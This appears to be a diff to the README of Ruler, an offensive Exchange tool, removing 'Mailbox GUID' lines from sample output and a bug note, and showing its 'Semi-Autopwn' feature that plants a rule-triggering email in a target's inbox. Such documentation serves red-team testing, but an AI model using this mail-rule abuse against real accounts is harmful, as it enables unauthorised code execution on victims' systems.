@@ -199,7 +199,6 @@ Output:
 [+] User DN:  /o=Evilcorp/ou=Exchange Administrative Group (FYDIBOHF23SPDLT)/cn=Recipients/cn=beb65f5c92f74b868c138f7bcec7bfb8-John Ford
 [*] Got Context, Doing ROPLogin
 [*] And we are authenticated
-[+] Mailbox GUID:  [251 102 208 159 53 202 228 77 184 67 76 15 228 47 61 223]
 [*] Openning the Inbox
 [+] Retrieving Rules
 [+] Found 0 rules
@@ -237,7 +236,6 @@ Output:
 [+] User DN:  /o=Evilcorp/ou=Exchange Administrative Group (FYDIBOHF23SPDLT)/cn=Recipients/cn=beb65f5c92f74b868c138f7bcec7bfb8-John Ford
 [*] Got Context, Doing ROPLogin
 [*] And we are authenticated
-[+] Mailbox GUID:  [251 102 208 159 53 202 228 77 184 67 76 15 228 47 61 223]
 [*] Openning the Inbox
 [*] Adding Rule
 [*] Rule Added. Fetching list of rules...
@@ -249,8 +247,6 @@ You should now be able to send an email to your target with the trigger string i
 
 # Semi-Autopwn
 
-__*Note there is currently a bug where sending doesn't work with RPC/HTTP__
-
 If you want to automate the triggering of the rule, Ruler is able to create a new message in the user's inbox, using their own email address. This means you no longer need to send an email to your target. Simply use the ```--send``` flag when creating your rule, and Ruler will wait 30seconds for your rules to synchronise (adjust this in the source if you think 30s is too long/short) and then send an email via MAPI.
 
 ```
@@ -261,7 +257,6 @@ If you want to automate the triggering of the rule, Ruler is able to create a ne
 [+] User DN:  /o=First Organization/ou=Exchange Administrative Group(FYDIBOHF23SPDLT)/cn=Recipients/cn=0003BFFDFEF9FB24
 [*] Got Context, Doing ROPLogin
 [*] And we are authenticated
-[+] Mailbox GUID: dc561d32a809304b8dbc91cc9f0ae1e2
 [*] Openning the Inbox
 [*] Adding Rule
 [*] Rule Added. Fetching list of rules...
